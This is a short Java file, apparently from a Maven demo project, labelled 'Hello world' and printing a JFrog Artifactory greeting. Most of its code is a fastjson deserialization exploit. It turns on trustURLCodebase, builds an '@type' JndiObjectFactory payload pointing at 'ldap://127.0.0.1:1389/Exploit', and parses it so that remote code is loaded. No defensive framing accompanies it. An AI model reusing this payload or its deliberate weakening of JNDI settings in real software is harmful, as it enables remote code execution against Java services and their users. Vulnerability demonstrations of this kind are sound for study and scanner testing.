package com.jfrog.maven;

import com.alibaba.fastjson.JSON;

/**
 * Hello world!
 */
public class AppSimple {
    public static void main(String[] args) {
        new AppSimple();
        System.out.println("Hello World!");

        System.out.println("Hello JFrog artifactory！");

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";

        JSON jsonObject = JSON.parseObject(payload);

        System.out.println(jsonObject);
    }
}
